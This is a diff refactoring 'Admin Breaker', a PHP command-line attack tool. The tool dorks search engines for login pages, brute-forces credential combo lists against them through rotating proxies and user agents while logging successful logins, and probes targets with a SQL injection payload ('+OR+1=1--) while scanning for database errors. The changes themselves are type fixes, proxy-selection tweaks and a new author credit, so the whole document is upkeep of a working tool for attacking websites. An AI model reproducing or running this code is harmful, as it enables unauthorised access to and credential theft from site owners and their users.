@@ -3,7 +3,7 @@
 <?php
 /**
  * Admin Breaker v4.1 Ultimate MixHunter (Refactored)
- * By nyx6st (2025)
+ * By 0x6ick x NyxCode (2025)
  * PHP7+ CLI
  */
 
@@ -133,18 +133,18 @@ function writeLog(string $filename, string $line): void {
     file_put_contents(OUTPUT_FOLDER . $filename, $line . PHP_EOL, FILE_APPEND);
 }
 
-function httpRequest(string $url, array $post = null, string $proxy = null): array {
+function httpRequest(string $url, ?array $post = null, ?string $proxy = null): array {
     global $USER_AGENTS;
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 10);
     curl_setopt($ch, CURLOPT_USERAGENT, $USER_AGENTS[array_rand($USER_AGENTS)]);
-    if ($post) {
+    if ($post !== null) {
         curl_setopt($ch, CURLOPT_POST, true);
         curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
     }
-    if ($proxy) {
+    if ($proxy !== null) {
         curl_setopt($ch, CURLOPT_PROXY, $proxy);
     }
     $body = curl_exec($ch);
@@ -174,7 +174,9 @@ function runPhase1(array $dorks, array $engines, array $proxies, array $domainFi
             showProgressBar($count, $totalJobs);
             $url = sprintf($pattern, urlencode($dork));
             if (isBannedHost($url)) continue;
-            $resp = httpRequest($url, null, $proxies[array_rand($proxies)] ?? null);
+            // pilih proxy jika ada
+            $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
+            $resp = httpRequest($url, null, $proxy);
             if (!$resp['body']) continue;
             if (stripos($resp['body'], 'captcha') !== false) {
                 writeLog('captcha.txt', $url);
@@ -185,7 +187,8 @@ function runPhase1(array $dorks, array $engines, array $proxies, array $domainFi
                     if (isBannedHost($link)) continue;
                     if ($domainFilter && !collectMatch($link, $domainFilter)) continue;
                     if (in_array($link, $targets, true)) continue;
-                    $page = httpRequest($link, null, $proxies[array_rand($proxies)] ?? null);
+                    $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
+                    $page = httpRequest($link, null, $proxy);
                     if ($page['body'] && preg_match('/(<input[^>]+type=["\']?password|login|username)/i', $page['body'])) {
                         $targets[] = $link;
                         writeLog('targets.txt', $link);
@@ -212,7 +215,8 @@ function runPhase2(array $targets, array $combos, array $proxies, bool $debug): 
             $count++;
             showProgressBar($count, $total);
             list($u, $p) = strpos($c, '|') !== false ? explode('|', $c, 2) : explode(':', $c, 2);
-            $resp = httpRequest($tgt, ['username' => trim($u), 'password' => trim($p)], $proxies[array_rand($proxies)] ?? null);
+            $proxy = !empty($proxies) ? $proxies[array_rand($proxies)] : null;
+            $resp = httpRequest($tgt, ['username' => trim($u), 'password' => trim($p)], $proxy);
             if ($resp['body'] && preg_match('/(dashboard|logout|admin-panel)/i', $resp['body'])) {
                 echo C_GREEN . "    [+] SUCCESS: {$u}|{$p}\n" . C_RESET;
                 writeLog('success.txt', "{$tgt} | {$u}|{$p}");
@@ -236,7 +240,7 @@ function runPhase3(array $targets, bool $debug): void {
         $count++;
         showProgressBar($count, $total);
         $testUrl = rtrim($link, '/') . urlencode("'+OR+1=1--");
-        $resp = httpRequest($testUrl);
+        $resp = httpRequest($testUrl, null, null);
         handleBan($link, $resp['http_code']);
         pause();
         if ($resp['body'] && preg_match('/(SQL syntax|mysql_fetch_array|ORA-00933|Unknown column|SQLSTATE)/i', $resp['body'])) {
